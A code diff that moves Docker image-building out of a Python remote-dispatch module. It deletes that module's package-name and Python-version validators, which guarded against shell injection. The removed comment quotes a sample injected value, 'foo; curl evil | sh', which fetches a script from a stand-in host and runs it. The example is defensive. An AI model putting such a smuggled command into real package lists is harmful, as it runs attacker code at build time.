@@ -12,54 +12,17 @@ from __future__ import annotations
 import asyncio
 import json
 import logging
-import re
 from typing import Any
 
 from app.config import settings
 from app.models import RunnerPool
+from app.services.container_runtime import (
+    ensure_docker_image,
+    image_tag_for,
+)
 from app.services.executors.base import EventCallback
 
 logger = logging.getLogger("app.services.remote_dispatch")
-
-# RD-2: ``ensure_docker_image`` interpolates the env's package list and Python
-# version straight into a shell ``RUN uv pip install`` / ``FROM python:`` line in
-# the generated Dockerfile. Shell metacharacters in a package name (e.g.
-# ``"foo; curl evil | sh"``) would otherwise execute at build time. The env is
-# admin-controlled (``environment:write``), but we validate as defence-in-depth.
-# Each requirement is restricted to a PEP 508 name + optional extras + optional
-# version specifiers using only characters that cannot break out of the shell
-# word (no spaces, quotes, ``;``, ``|``, ``&``, ``$``, ``()``, backticks, …).
-_PKG_SPEC_RE = re.compile(
-    r"^[A-Za-z0-9][A-Za-z0-9._-]*"                      # distribution name
-    r"(\[[A-Za-z0-9._,-]+\])?"                          # optional extras
-    r"((===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+"         # first version specifier
-    r"(,(===|==|!=|<=|>=|~=|<|>)[A-Za-z0-9._-]+)*)?$"   # further specifiers
-)
-_PY_VERSION_RE = re.compile(r"^[0-9]+(\.[0-9]+){0,2}$")
-
-
-def _validate_packages(packages: list[str]) -> list[str]:
-    """Return the validated package specifiers or raise ``ValueError`` (RD-2)."""
-    safe: list[str] = []
-    for raw in packages:
-        spec = str(raw).strip()
-        if not spec:
-            continue
-        if not _PKG_SPEC_RE.match(spec):
-            raise ValueError(
-                f"invalid package specifier {spec!r}: only PEP 508 name/extras/"
-                "version specifiers are allowed (no shell metacharacters)"
-            )
-        safe.append(spec)
-    return safe
-
-
-def _validate_python_version(version: str) -> str:
-    """Return a validated ``X[.Y[.Z]]`` Python version or raise ``ValueError`` (RD-2)."""
-    v = str(version or "").strip()
-    if not _PY_VERSION_RE.match(v):
-        raise ValueError(f"invalid python_version {version!r}: expected e.g. '3.12'")
-    return v
 
 
 async def assign_docker_run(
@@ -94,10 +57,7 @@ async def assign_docker_run(
         else docker.DockerClient(base_url=docker_host)
     )
 
-    image_tag = (
-        f"noodle-env:{env_payload.get('id', 'default')}"
-        f"-{env_payload.get('packages_hash', 'latest')}"
-    )
+    image_tag = image_tag_for(env_payload)
     network = cfg.get("network", "bridge")
 
     loop = asyncio.get_running_loop()
@@ -210,36 +170,3 @@ async def assign_docker_run(
             pass
 
     return status
-
-
-def ensure_docker_image(client: Any, image_tag: str, env_payload: dict) -> None:
-    """Build a Docker image for this env if it doesn't exist. Sync — runs in executor."""
-    try:
-        client.images.get(image_tag)
-        return  # Cache hit
-    except Exception:  # noqa: BLE001
-        pass  # Image not found, build it
-
-    python_version = _validate_python_version(env_payload.get("python_version", "3.12"))
-    packages = _validate_packages(env_payload.get("packages") or [])
-    packages_str = " ".join(packages) if packages else ""
-    install_line = (
-        f"RUN uv pip install --system noodle-runtime noodle-nodes noodle-core {packages_str}"
-        if packages_str
-        else "RUN uv pip install --system noodle-runtime noodle-nodes noodle-core"
-    )
-
-    dockerfile = (
-        f"FROM python:{python_version}-slim\n"
-        "RUN pip install uv --quiet\n"
-        f"{install_line}\n"
-        'ENTRYPOINT ["python", "-u", "-m", "noodle_runtime"]\n'
-    )
-
-    import io  # noqa: PLC0415
-    client.images.build(
-        fileobj=io.BytesIO(dockerfile.encode()),
-        tag=image_tag,
-        rm=True,
-    )
-    logger.info("built docker image %s", image_tag)
